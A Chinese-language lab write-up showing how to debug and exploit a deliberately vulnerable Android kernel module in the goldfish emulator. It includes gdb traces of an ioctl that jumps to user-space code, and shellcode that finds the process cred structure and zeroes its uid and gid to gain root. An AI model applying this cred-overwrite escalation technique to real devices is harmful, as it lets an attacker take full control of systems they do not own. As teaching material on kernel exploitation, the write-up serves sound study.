按前面文章将环境搭好之后，开始调试漏洞。现在3.4内核上调试，3.4上面没有开启PXN，利用比较简单。

完整代码参考vulkdev1，当通过ioctl发送VULDEV_START_CMD时会触发执行任意代码，下面是整个调试过程。

添加vulklab代码，将整个vulklab目录放在goldfish源码根目录下，编辑goldfish源码根目录下的Makefile，做如下修改添加vulklab编译：
--------------------------------------
-drivers-y := drivers/ sound/ firmware/
+drivers-y := drivers/ sound/ firmware/ vulklab/
--------------------------------------
然后编译整个goldfish即可，编译出vulkdev.ko
 
编译exp，注意先把ndk加入环境变量：
export PATH=/workspace/vulklab/sdk/ndk-bundle:$PATH
然后到vulkexp目录执行ndk-build进行编译，生成libs/armeabi-v7a/vulkdev_exp1
将vulkdev.ko和vulkdev_exp1都push到模拟器中

# insmod vulklab.ko

找到目标函数符号地址                           

# echo 1 > /proc/sys/kernel/kptr_restrict                       

# cat /proc/kallsyms | grep vulkdev_start                       

bf000024 t vulkdev_start        [vulklab]

 

执行调试

$ arm-linux-gdb vmlinux

 (gdb) target remote:1234

Remote debugging using :1234

(gdb) c

Continuing.

^C

Program received signal SIGINT, Interrupt.

0xad3097cc in ?? ()

(gdb) b *0xbf000024

Breakpoint 1 at 0xbf000024

(gdb) c

Continuing.

 

为了演示，执行前先chmod 666 /dev/vulkdev1，再su shell降为普通shell权限，再执行exp，将触发断点

$ ./vulkdev_exp1                                  

getuid() = 2000

ioctl VULDEV_START_CMD, kernel_code = 0xad766879

 

Breakpoint 1, 0xbf000024 in ?? ()

(gdb) display /5i $pc

1: x/5i $pc

=> 0xbf000024:  push    {r4, lr}

   0xbf000028:  mov     r4, r0

   0xbf00002c:  mov     r1, r4

   0xbf000030:  ldr     r0, [pc, #8]    ; 0xbf000040

   0xbf000034:  bl      0xc0369184 <printk>

(gdb) ni

0xbf000028 in ?? ()

1: x/5i $pc

=> 0xbf000028:  mov     r4, r0

   0xbf00002c:  mov     r1, r4

   0xbf000030:  ldr     r0, [pc, #8]    ; 0xbf000040

   0xbf000034:  bl      0xc0369184 <printk>

   0xbf000038:  blx     r4

继续单步调试...直到下面的blx r4跳转

(gdb)

0xbf00003c in ?? ()

1: x/5i $pc

=> 0xbf00003c:  blx     r4

   0xbf000040:  pop     {r4, pc}

   0xbf000044:  push    {r3, lr}

   0xbf000048:  movw    r3, #27394      ; 0x6b02

   0xbf00004c:  cmp     r1, r3

此时看下r4寄存器的值，刚好为exp里输出的用户态函数地址0xad766879

(gdb) i r r4

r4             0xad766879       -1384748935

执行si跟进去，就来到了用户态的shellcode，搜索并修改cred，可以ni继续单步调试

(gdb) si

0xad766878 in ?? ()

1: x/5i $pc

=> 0xad766878:  push    {r4, r6, r7, lr}

   0xad76687a:  add     r7, sp, #8

   0xad76687c:  mov     r0, sp

   0xad76687e:  movw    r1, #8191       ; 0x1fff

   0xad766882:  mov.w   r12, #0

(gdb) ni

0xad76687c in ?? ()

1: x/5i $pc

=> 0xad76687c:  mov     r0, sp

   0xad76687e:  movw    r1, #8191       ; 0x1fff

   0xad766882:  mov.w   r12, #0

   0xad766886:  bics    r0, r1

   0xad766888:  mov.w   r1, #4294967295 ; 0xffffffff

(gdb)

 调试完毕，再看，程序已经成功提权成root：

root@generic:/data/local/tmp $ ./vulkdev_exp1                                  

getuid() = 2000

ioctl VULDEV_START_CMD, kernel_code = 0xad0c9879

getuid() = 0

root@generic:/data/local/tmp #

 

补充说明：
1. 上面所使用的提权代码是通过sp计算thread_info地址，进一步定位到task_struct中的cred并修改。该代码借鉴自某个漏洞的exp。其中获取sp的代码，不知道是编译原因还是其他原因，编译生成后的汇编代码无法获取到sp，导致利用不成功，所以临时复习了一下内联汇编，对相关代码做了如下调整，利用成功，其中注掉的是原始代码：

static inline struct thread_info * current_thread_info(void)
{
 //register unsigned long sp asm ("sp");
 //return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));

 register unsigned long reg_sp;
 asm volatile (
 " mov %0, sp\n"
 : "=&r" (reg_sp)
 );
 return (struct thread_info *)(reg_sp & ~(THREAD_SIZE - 1));
}

2. ko方式加载，上面通过cat /proc/kallsyms方式查找到目标函数地址，资料上还有另一种方式查找地址如下，供参考：

首先需在编译模块时加入调试信息。两种方式，一种是编译时使用“make COPTS-g”，另一种是用“gcc -g”作为“gcc”的别名。加载模块，找到模块的加载位置。原文是用kldstat命令，linux下没找到，但是可以通过cat /proc/modules | grep vuldev找到模块的加载地址：
# cat /proc/modules | grep vuldev
vuldev 1072 0 - Live 0xffffffffa001b000
然后找到代码段.text段的偏移量：
# objdump --section-headers vuldev.o | grep text
   0 .text 00000048 0000000000000000 0000000000000000 00000040 2**4
   1 .exit.text 00000023 0000000000000000 0000000000000000 00000088 2**0
   2 .init.text 00000026 0000000000000000 0000000000000000 000000ab 2**0
可以看到.text偏移量是0x00000040，模块的代码在重定向之后的地址就可以计算出来：0xffffffffa001b000 + 0x00000040 = 0xFFFFFFFFA001B040
然后按照如下方式即可加载模块符号开始调试：
gdb goldfish/vmlinux
(gdb) add-symbol-file goldfish/vuldev/vuldev.ko 0xFFFFFFFFA001B040
add symbol table from file "goldfish/vuldev/vuldev.ko" at
               .text_addr = 0xffffffffa001b040
(y or n) y
Reading symbols from goldfish/vuldev/vuldev.ko...done.
(gdb)

这是使用了模块加载基址加段偏移计算得到的，还有一种方法如下：
在加载vuldev模块后, 目录 /sys/module/vuldev/sections 包含名子为 .text 的文件; 每个文件的内容是对应段的基地址，根据这些信息即可使用如下命令来加载符号：
(gdb) add-symbol-file goldfish/vuldev/vuldev.ko 0xd0832000 -s .bss 0xd0837100 -s .data 0xd0836be0
其中三个地址分别是.text段、.bss段、.data段基地址，然后就可以使用gdb的print命令查看模块相关数据结构了。
但这样仍不能进行典型的调试任务, 如设置断点或者修改数据; 为进行这些操作, 我们需要使用象 kdb或者kgdb

3. 为调试方便可以改下Makefile将obj-m改为obj-y，采用build-in方式，直接断点b vuldev_start调试内核就好，不需要insmod或查找函数符号，下面是之前的调试记录，供参考

$ arm-linux-gdb goldfish/vmlinux
Reading symbols from goldfish/vmlinux...done.
(gdb) target remote :1234
Remote debugging using :1234
(gdb) c
Continuing.
^C Ctrl+C打断当前Continue执行状态以便执行gdb命令
Program received signal SIGINT, Interrupt.
cpu_v7_do_idle () at arch/arm/mm/proc-v7.S:74
74 mov pc, lr
(gdb) b vuldev_start 断点指定函数vuldev_start
Breakpoint 1 at 0xc0267f9c: file vuldev/vuldev.c, line 42.
(gdb) c
Continuing.

然后在adb shell中执行./exploit触发漏洞，这时gdb中将会断下来：

Breakpoint 1, vuldev_start (arg=34513) at vuldev/vuldev.c:42
42 {
(gdb) list 查看下断点附近的代码
37 {
38 printk(KERN_DEBUG "vuldev_stop called\n");
39 }
40
41 void vuldev_start(unsigned long arg)
42 {
43 printk(KERN_DEBUG "vuldev_start called, arg=0x%lx\n", arg);
44 ((int (*)(void))(arg))();
45 }
46
(gdb) n 单步执行代码
43 printk(KERN_DEBUG "vuldev_start called, arg=0x%lx\n", arg);
(gdb) n 单步执行代码，下一步就要进入用户态提权代码了
44 ((int (*)(void))(arg))();
(gdb) display /5i $pc 接下来看反汇编代码，每单步一步就显示当前的5条汇编指令
1: x/5i $pc
=> 0xc0267fb0 <vuldev_start+20>: blx r4 # 这里显示马上就调到r4寄存器存储的地址里了，这里就是用户态函数地址
   0xc0267fb4 <vuldev_start+24>: pop {r4, pc}
   0xc0267fb8 <vuldev_start+28>: subgt r10, r4, r1, asr #29
   0xc0267fbc <vuldev_ioctl>: push {r3, lr}
   0xc0267fc0 <vuldev_ioctl+4>: movw r3, #27394 ; 0x6b02
(gdb) i r r4 看下r4寄存器内容，0x86d1，即用户提权函数地址
r4 0x86d1 34513
(gdb) si 单步进入该汇编指令地址，就到了提权函数里
0x000086d0 in ?? ()
1: x/5i $pc
=> 0x86d0: push {r4, r5, r6, r7, lr}
   0x86d2: mov r2, sp
   0x86d4: lsrs r3, r2, #13
   0x86d6: lsls r3, r3, #13
   0x86d8: ldr r2, [r3, #12]
(gdb) ni
接下来就可以用ni一步步执行用户态的搜索cred结构修改uid的代码了。
一直ni来到这里，看下uid的过程：
(gdb)
0x0000870e in ?? ()
1: x/5i $pc
=> 0x870e: cmp r1, r6
   0x8710: bne.n 0x86ea # 这是一个循环搜索的过程
   0x8712: b.n 0x878e
   0x8714: movs r2, #0 # 这里就是搜索cred完毕，开始修改uid了
   0x8716: str r2, [r3, #4]
(gdb) b *0x8714 直接在循环之后下个断点，循环完后断下来
Breakpoint 2 at 0x8714
(gdb) c
Continuing.

Breakpoint 2, 0x00008714 in ?? ()
1: x/5i $pc
=> 0x8714: movs r2, #0
   0x8716: str r2, [r3, #4] # 从这里开始将r3指向的结构体的各个成员写为0
   0x8718: str r2, [r3, #8] # r3明显就是cred结构地址了
   0x871a: str r2, [r3, #12]
   0x871c: str r2, [r3, #16]
(gdb) p *(struct cred*)$r3 看下r3存储的cred结构体内容，当前uid、gid等等都为2000
$1 = {usage = {counter = 7}, uid = 2000, gid = 2000, suid = 2000, sgid = 2000,
  euid = 2000, egid = 2000, fsuid = 2000, fsgid = 2000, securebits = 0,
  cap_inheritable = {cap = {0, 0}}, cap_permitted = {cap = {0, 0}},
  cap_effective = {cap = {0, 0}}, cap_bset = {cap = {4294967295, 4294967295}},
  security = 0xd4284200, user = 0xde065400,
  user_ns = 0xc04d84c0 <init_user_ns>, group_info = 0xc04d91e0 <init_groups>,
  rcu = {next = 0x0, func = 0x0}}
(gdb) ni
0x00008716 in ?? ()
1: x/5i $pc
=> 0x8716: str r2, [r3, #4]
   0x8718: str r2, [r3, #8]
   0x871a: str r2, [r3, #12]
   0x871c: str r2, [r3, #16]
   0x871e: str r2, [r3, #20]
(gdb)
0x00008718 in ?? ()
1: x/5i $pc
=> 0x8718: str r2, [r3, #8]
   0x871a: str r2, [r3, #12]
   0x871c: str r2, [r3, #16]
   0x871e: str r2, [r3, #20]
   0x8720: str r2, [r3, #24]
(gdb) p *(struct cred*)$r3 执行完str r2, [r3, #8]指令后可以看到uid已经变成0了
$2 = {usage = {counter = 7}, uid = 0, gid = 2000, suid = 2000, sgid = 2000,
  euid = 2000, egid = 2000, fsuid = 2000, fsgid = 2000, securebits = 0,
  cap_inheritable = {cap = {0, 0}}, cap_permitted = {cap = {0, 0}},
  cap_effective = {cap = {0, 0}}, cap_bset = {cap = {4294967295, 4294967295}},
  security = 0xd4284200, user = 0xde065400,
  user_ns = 0xc04d84c0 <init_user_ns>, group_info = 0xc04d91e0 <init_groups>,
  rcu = {next = 0x0, func = 0x0}}
(gdb) ni 继续修改gid等cred成员
0x0000871a in ?? ()
1: x/5i $pc
=> 0x871a: str r2, [r3, #12]
   0x871c: str r2, [r3, #16]
   0x871e: str r2, [r3, #20]
   0x8720: str r2, [r3, #24]
   0x8722: str r2, [r3, #28]
(gdb) p *(struct cred*)$r3
$3 = {usage = {counter = 7}, uid = 0, gid = 0, suid = 2000, sgid = 2000,
  euid = 2000, egid = 2000, fsuid = 2000, fsgid = 2000, securebits = 0,
  cap_inheritable = {cap = {0, 0}}, cap_permitted = {cap = {0, 0}},
  cap_effective = {cap = {0, 0}}, cap_bset = {cap = {4294967295, 4294967295}},
  security = 0xd4284200, user = 0xde065400,
  user_ns = 0xc04d84c0 <init_user_ns>, group_info = 0xc04d91e0 <init_groups>,
  rcu = {next = 0x0, func = 0x0}}
(gdb) ni
0x0000871c in ?? ()
1: x/5i $pc
=> 0x871c: str r2, [r3, #16]
   0x871e: str r2, [r3, #20]
   0x8720: str r2, [r3, #24]
   0x8722: str r2, [r3, #28]
   0x8724: str r2, [r3, #32]
(gdb)
0x0000871e in ?? ()
1: x/5i $pc
=> 0x871e: str r2, [r3, #20]
   0x8720: str r2, [r3, #24]
   0x8722: str r2, [r3, #28]
   0x8724: str r2, [r3, #32]
   0x8726: movs r2, #1
(gdb) c
Continuing.


